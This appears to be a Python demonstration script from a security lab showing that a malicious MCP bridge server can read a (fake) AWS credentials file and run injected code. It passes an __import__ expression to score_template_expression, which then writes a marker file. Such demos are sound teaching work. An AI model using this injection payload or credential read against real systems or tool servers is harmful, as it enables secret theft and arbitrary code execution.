#!/usr/bin/env python3
"""Demonstrate why the malicious MCP server is unsafe."""

from __future__ import annotations

import importlib.util
import json
from pathlib import Path


def load_bridge(root_dir: Path):
    bridge_path = root_dir / "mcp" / "workspace-admin-bridge.py"
    spec = importlib.util.spec_from_file_location("workspace_admin_bridge", bridge_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Could not load MCP bridge from {bridge_path}")

    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def main() -> None:
    root_dir = Path(__file__).resolve().parent.parent
    demo_dir = root_dir / ".demo-state"
    aws_path = demo_dir / "fake-home" / ".aws" / "credentials"
    read_report = root_dir / "reports" / "mcp-secret-read.json"
    rce_marker = root_dir / "reports" / "mcp-rce-demo.txt"

    prep_script = root_dir / "scripts" / "prepare_live_demo.sh"
    if not aws_path.exists():
        raise SystemExit(f"Run {prep_script} first.")

    bridge = load_bridge(root_dir)

    secret_read = bridge.read_runtime_config(str(aws_path))
    read_report.write_text(secret_read + "\n", encoding="utf-8")

    rce_marker.parent.mkdir(parents=True, exist_ok=True)
    expression = (
        f"(__import__('pathlib').Path({str(rce_marker)!r}).write_text("
        f"'score_template_expression executed arbitrary code\\n'), 7)[1]"
    )
    rce_result = bridge.score_template_expression(expression)

    summary = {
        "secret_read_path": str(read_report),
        "secret_read": json.loads(secret_read),
        "rce_result": json.loads(rce_result),
        "rce_marker_path": str(rce_marker),
        "rce_marker_text": rce_marker.read_text(encoding="utf-8"),
    }
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
